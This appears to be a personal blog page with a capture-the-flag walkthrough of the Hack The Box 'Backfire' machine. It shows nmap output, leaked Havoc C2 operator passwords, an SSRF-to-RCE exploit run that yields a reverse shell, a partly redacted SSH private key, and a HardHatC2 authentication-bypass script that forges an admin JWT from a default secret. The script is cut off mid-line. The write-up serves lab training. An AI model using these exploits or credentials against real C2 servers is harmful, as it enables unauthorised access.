@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="Table of Contents Enumeration with Nmap Exploring Port 8000 foothold Privilege Escalation  In this walkthrough, we’ll explore the steps to compromise the Caption machineon Hack The Box. We’ll cover en">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BACKFIRE">
+<meta property="og:url" content="http://nutzh.top/backfire/">
+<meta property="og:site_name" content="NUTZH">
+<meta property="og:description" content="Table of Contents Enumeration with Nmap Exploring Port 8000 foothold Privilege Escalation  In this walkthrough, we’ll explore the steps to compromise the Caption machineon Hack The Box. We’ll cover en">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-01-20T18:17:30.599Z">
+<meta property="article:modified_time" content="2025-01-20T19:53:23.354Z">
+<meta property="article:author" content="NUTZH">
+<meta property="article:tag" content="HACK THE BOX">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PENETRATION TESTING">
+<meta property="article:tag" content="LINUX">
+<meta name="twitter:card" content="summary">
+
+    <meta name="keywords" content="CTF , HACKTHEBOX , ACTIVE MACHINE">
+
+
+<title >BACKFIRE</title>
+
+<!-- Favicon -->
+
+    <link href='/favico.png?v=2.2.4' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/favico.png?v=2.2.4' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='/apple-touch-icon.png?v=2.2.4' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+    <link href='/site.webmanifest' rel='manifest' ></link>
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"nutzh.top","author":"NUTZH","root":"/","typed_text":["Cybersecurity Student"],"theme_version":"2.2.4","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"favico.png","icon16":"favico.png","icon32":"favico.png","apple_touch_icon":"apple-touch-icon.png","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"favico.png","show_text":"(/≧▽≦/)","hide_text":"(●—●)"},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms","author":"Post author: ","copyright_link":"Post link: ","copyright_license_title":"Copyright Notice: ","copyright_license_content":"All articles in this blog are licensed under undefined unless otherwise stated.","copy_success":"Copied","copy_failure":"Copy failed","open_read_mode":"Enter reading mode","exit_read_mode":"Exit reading mode","notice_outdate_message":"It has been undefined days since the last update, the content of the article may be outdated.","sticky":"TOP","just":"Just","min":"minutes ago","hour":"hours ago","day":"days ago","month":"months ago"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"mac","height_limit":false},"toc":{"post_title":true},"live_time":{"start_time":"","prefix":"The blog has been lovely to run undefined day"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-01-20 20:53:23"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.4" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+
+     
+
+    
+        <!-- Google Analytics -->
+        <script async src='https://www.googletagmanager.com/gtag/js?id=G-77TF3MK6G4'></script>
+        <script defer>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-77TF3MK6G4');
+        </script>
+    
+
+    
+ 
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="NUTZH" type="application/atom+xml">
+</head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/favico.png">
+    
+    
+        <div class="trm-logo-text">
+            NUTZH<span>NOTE</span>
+        </div>
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    home
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    TimeLine
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a data-no-swup href="/projects/" target="">
+                    projects
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/about/" target="">
+                    about
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+    
+    <div id="trm-search-btn" class="trm-search-btn">
+        <i class="iconfont fas fa-search"></i>
+    </div>
+     
+
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="https://www.fontshmonts.com/wp-content/uploads/2023/08/backfired-free-font-01.jpg">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            BACKFIRE
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            BACKFIRE
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        backfire
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="https://image.cdn2.seaart.me/2023-07-22/47696317661253/37482c38198763e17698578f71a61a0f0f151ae5_high.webp">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        NUTZH
+    </h5>
+    
+        <div class="trm-label">
+            I`m
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com/0xDEZZNUTZ" title="github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+        <a href="https://www.linkedin.com/in/youssef-k-ab87061ba/" title="linkdin" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-linkedin"></i>
+        </a>
+    
+        <a href="https://www.instagram.com/deez.nutz_lh/" title="instagram" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-instagram"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                whoami:
+            </div>
+            <div class="trm-label trm-label-light">
+                YOUSSEF.K
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                age:
+            </div>
+            <div class="trm-label trm-label-light">
+                20
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                address:
+            </div>
+            <div class="trm-label trm-label-light">
+                earth
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:0xnutzh@gmail.com" class="trm-btn" style="
+            background: linear-gradient(135deg, #6e8efb, #4a6cf7);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        ">
+            E-mail me
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+    </div>
+</div>
+
+
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            01/20
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            19:17
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            NUTZH
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
+<li><a href="#enumeration-with-nmap">Enumeration with Nmap</a></li>
+<li><a href="#Exploring-Port-8000">Exploring Port 8000</a></li>
+<li><a href="#foothold">foothold</a></li>
+<li><a href="#privilege-escalation">Privilege Escalation</a></li>
+</ol>
+<p>In this walkthrough, we’ll explore the steps to compromise the Caption machine<br>on Hack The Box. We’ll cover enumeration, vulnerability discovery,<br>exploitation, and privilege escalation. Let’s dive in!</p>
+<h2 id="enumeration-nmap"><a href="#enumeration-nmap" class="headerlink" title="enumeration nmap"></a>enumeration nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.49 -T5</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 19:19 +01</span><br><span class="line">Nmap scan report <span class="keyword">for</span> backfire.htb (10.10.11.49)</span><br><span class="line">Host is up (0.058s latency).</span><br><span class="line">Not shown: 996 closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)</span><br><span class="line">443/tcp  open     ssl/http nginx 1.22.1</span><br><span class="line">5000/tcp filtered upnp</span><br><span class="line">8000/tcp open     http     nginx 1.22.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.91 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>Port 22 (SSH): OpenSSH is running, which could be a potential entry point<br>if we find valid credentials.</p>
+</li>
+<li><p>Port 443 (HTTPS): Nginx is serving a web application over HTTPS.</p>
+</li>
+<li><p>Port 5000 (UPnP): Filtered, meaning it’s likely blocked by a firewall.</p>
+</li>
+<li><p>Port 8000 (HTTP): Nginx is serving another web application over HTTP.</p>
+</li>
+</ul>
+<h2 id="Exploring-Port-8000"><a href="#Exploring-Port-8000" class="headerlink" title="Exploring Port 8000"></a>Exploring Port 8000</h2><p>We navigate to <a target="_blank" rel="noopener" href="http://10.10.11.49:8000/">http://10.10.11.49:8000</a> and find two files:</p>
+<ul>
+<li><p>havoc.yaotl</p>
+</li>
+<li><p>disable_tls.patch</p>
+</li>
+</ul>
+<p>The havoc.yaotl file contains interesting information, including credentials and configuration details for a Havoc C2 framework.</p>
+<p>Contents of <strong>havoc.yaotl</strong>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Demon &#123;</span><br><span class="line">    Sleep = 2</span><br><span class="line">    Jitter = 15</span><br><span class="line"></span><br><span class="line">    TrustXForwardedFor = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    Injection &#123;</span><br><span class="line">        Spawn64 = <span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span></span><br><span class="line">        Spawn32 = <span class="string">&quot;C:\\Windows\\SysWOW64\\notepad.exe&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">Operators &#123;</span><br><span class="line">    user <span class="string">&quot;ilya&quot;</span> &#123;</span><br><span class="line">        Password = <span class="string">&quot;CobaltStr1keSuckz!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    user <span class="string">&quot;sergej&quot;</span> &#123;</span><br><span class="line">        Password = <span class="string">&quot;1w4nt2sw1tch2h4rdh4tc2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Key Findings:</p>
+<ul>
+<li><p>Credentials for two users: ilya and sergej.</p>
+</li>
+<li><p>The configuration suggests the presence of a Havoc C2 framework.</p>
+</li>
+</ul>
+<h2 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h2><p>After some research, we discover that the Havoc C2 framework is vulnerable to SSRF (Server-Side Request Forgery) and RCE (Remote Code Execution).<br>The following resources provide more details:</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce"><strong>Havoc C2 Vulnerabilities RCE</strong></a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/chebuya/Havoc-C2-SSRF-poc/blob/main/exploit.py"><strong>Havoc C2 SSRF PoC</strong></a></p>
+</li>
+</ul>
+<p>We also find a script that combines both vulnerabilities to achieve SSRF to RCE:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/pich4ya/bda16a3b2104bea411612f20d536174b"><strong>SSRF to RCE Script</strong></a></li>
+</ul>
+<p>We create a Python virtual environment to ensure all dependencies are met.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv</span><br><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br></pre></td></tr></table></figure>
+
+<p>We start a netcat listener on port 443 to catch the reverse shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 443</span><br></pre></td></tr></table></figure>
+<p>We use the ssrf2rce.py script to exploit the vulnerability. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python3 ssrf2rce.py -t https://10.10.11.49:443 -l 10.10.14.225 --c2user ilya --c2pass <span class="string">&#x27;CobaltStr1keSuckz!&#x27;</span> </span><br><span class="line">[***] Trying to register agent...</span><br><span class="line">[***] Success!</span><br><span class="line">[***] Trying to open socket on the teamserver...</span><br><span class="line">[***] Success!</span><br><span class="line">[***] Trying to write to the socket</span><br><span class="line">[***] Success!</span><br><span class="line">[***] Trying to write to the socket</span><br><span class="line">[***] Success!</span><br><span class="line">23983</span><br><span class="line">[***] Trying to write to the socket</span><br><span class="line">[***] Success!</span><br><span class="line">[***] Trying to write to the socket</span><br><span class="line">[***] Success!</span><br><span class="line">[***] Trying to poll teamserver <span class="keyword">for</span> socket output...</span><br><span class="line">[***] Read socket output successfully!</span><br></pre></td></tr></table></figure>
+<p>Back on our listener, we receive a reverse shell as the user ilya.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 443 </span><br><span class="line">$ listening on [any] 443 ...</span><br><span class="line">connect to [10.10.14.225] from (UNKNOWN) [10.10.11.49] 37496</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (898): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">ilya@backfire:~/Havoc/payloads/Demon$ <span class="built_in">whoami</span> </span><br><span class="line">ilya</span><br></pre></td></tr></table></figure>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>We use the linpeas.sh tool to enumerate the system for potential privilege<br>escalation vectors.</p>
+<p>Finding:</p>
+<ul>
+<li>The SSH private key for the user ilya is discovered.</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAyKwoxqjIPVtCeHWG7zs1N+sOIg3bUa0PN4LMw664TnQKEvUqNorU</span><br><span class="line">8BsOjPIXMfhjWkvII9S7xq+7WQQRUjbXceFbv3QwZhmFb/bT9AYxqCVpJ/Uvr7uE0u24NW</span><br><span class="line">eCSq47k2y6iEysUz1M3O/VfW6p5Fmc0GD8OBIoD5KHsVyz4QYogJybOyoFO3nFzByIhB1z</span><br><span class="line">MaJrBTGd13R5n6E747xUeXETeusDeruHvC+U/B9+sYsr0/xugnDFpuIzLvvoCRwjXyTztj</span><br><span class="line">xVQrrRp2KGnYBh9wHbFQ8IxATXeUTSlGaPIgEw4s1kaKY/vC1oaZ7AiDEkhrWV4g2GB0XG</span><br><span class="line">Rwq2ADr6EeAswe/tAuiht6tamBHXACVWyJlOttVqbW627iTwCn9XXltgGuSFNhnlB7B3CO</span><br><span class="line">0Y7Xhrzb3uzpvumNJ0JTjPNUD6ssXEPnb4JUyYpeE8s+BM3NRQSp6gNl93fpl27hutKW2Q</span><br><span class="line">NdQK9FPsQBK0eu9Oy6P6upJxul81N0q8O9kFqSo5AAAFiNBKac3QSmnNAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAMisKMaoyD1bQnh1hu87NTfrDiIN21GtDzeCzMOuuE50ChL1KjaK1PAbDozyFzH4</span><br><span class="line">Y1pLyCPUu8avu1kEEVI213HhW790MGYZhW/20/QGMaglaSf1L6+7hNLtuDVngkquO5Nsuo</span><br><span class="line">hMrFM9TNzv1X1uqeRZnNBg/DgSKA+Sh7Fcs+EGKICcmzsqBTt5xcwciIQdczGiawUxndd0</span><br><span class="line">eZ+hO+O8VHlxE3rrA3q7h7wvlPwffrGLK9P8boJwxabiMy776AkcI18k87Y8VUK60adihp</span><br><span class="line">2AYfcB2xUPCMQE13lE0pRmjyIBMOLNZGimP7wtaGmewIgxJIa1leINhgdFxkcKtgA6+hHg</span><br><span class="line">LMHv7QLooberWpgR1wAlVsiZTrbVam1utu4k8Ap/V15bYBrkhTYZ5QewdwjtGO14a8297s</span><br><span class="line">6b7pjSdCU4zzVA+rLFxD52+CVMmKXhPLPgTNzUUEqeoDZfd36Zdu4brSltkDXUCvRT7EAS</span><br><span class="line">tHrvTsuj+rqScbpfNTdKvDvZBakqOQAAAAMBAAEAAAGAAmLsvbcQYY1qKBNSulnYh0yV75</span><br><span class="line">D9XpZpp8n4DCwx4Cn4XDMa8EjcoSnbNZEj9jnLWa2syMNNA97/Yf6+w3zoOUAaNpfHwxES</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXX</span><br><span class="line">-----END OPENSSH PRIVATE KEY XXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
+
+<p>We forward ports to access services running locally on the target machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa ilya@10.10.11.49 -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>We find a note indicating that HardHatC2 is installed on the machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ilya@backfire:~$ <span class="built_in">cat</span> hardhat.txt</span><br><span class="line">Sergej said he installed HardHatC2 <span class="keyword">for</span> testing and  not made any changes to the defaults</span><br><span class="line">I hope he prefers Havoc bcoz I don<span class="string">&#x27;t wanna learn another C2 framework, also Go &gt; C#</span></span><br></pre></td></tr></table></figure>
+<p>After researching, we discover that HardHatC2 has an authentication bypass<br>vulnerability. We use the following script to exploit it:<br><a target="_blank" rel="noopener" href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7">https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @author Siam Thanat Hack Co., Ltd. (STH)</span></span><br><span class="line">import jwt</span><br><span class="line">import datetime</span><br><span class="line">import uuid</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">rhost = <span class="string">&#x27;hardhatc2.local:5000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Craft Admin JWT</span></span><br><span class="line">secret = <span class="string">&quot;jtee43gt-6543-2iur-9422-83r5w27hgzaq&quot;</span></span><br><span class="line">issuer = <span class="string">&quot;hardhatc2.com&quot;</span></span><br><span class="line">now = datetime.datetime.utcnow()</span><br><span class="line"></span><br><span class="line">expiration = now + datetime.timedelta(days=28)</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;HardHat_Admin&quot;</span>,  </span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: str(uuid.uuid4()),</span><br><span class="line">    <span class="string">&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: issuer,</span><br><span class="line">    <span class="string">&quot;aud&quot;</span>: issuer,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: int(now.timestamp()),</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: int(expiration.timestamp()),</span><br><span class="line">    <span class="string">&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;</span>: <span class="string">&quot;Administrator&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(payload, secret, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Generated JWT:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use Admin JWT to create a new user &#x27;sth_pentest&#x27; as TeamLead</span></span><br><span class="line">burp0_url = f<span class="string">&quot;https://&#123;rhost&#125;/Login/Register&quot;</span></span><br><span class="line">burp0_headers = &#123;</span><br><span class="line">  <span class="string">&quot;Authorization&quot;</span>: f<span class="string">&quot;Bearer &#123;token&#125;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">burp0_json = &#123;</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;nutzh&quot;</span>, <span class="comment"># you can choose what u want </span></span><br><span class="line">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;TeamLead&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span 